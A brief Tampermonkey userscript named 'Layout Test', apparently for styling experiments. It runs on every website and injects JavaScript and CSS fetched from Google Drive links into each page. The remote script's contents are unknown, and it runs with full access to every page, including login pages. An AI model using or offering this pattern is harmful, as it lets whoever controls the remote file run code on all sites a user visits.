// INSERT THIS INTO TAMPERMONKEY

// ==UserScript==
// @name         Layout Test
// @match        *://*/*
// @match        http://localhost/*
// @noframes
// @run-at document-end
// ==/UserScript==

(function() {
  'use strict';
  var head = document.getElementsByTagName('head').item(0);
  var script = document.createElement('script');
  var style = document.createElement('style');

  // JS
  script.setAttribute('type', 'text/javascript');
  script.setAttribute('src', 'https://drive.google.com/uc?export=download&id=13N3AmcnMk0fnRhFKTtDfI0abdT9iM6pI');


  // CSS
  style.innerHTML = '@import url("https://drive.google.com/uc?export=download&id=11WmMkN5G1NFNHAkZrvkrrdUac76PDtX1")';

  head.appendChild(script);
  head.appendChild(style);
})();
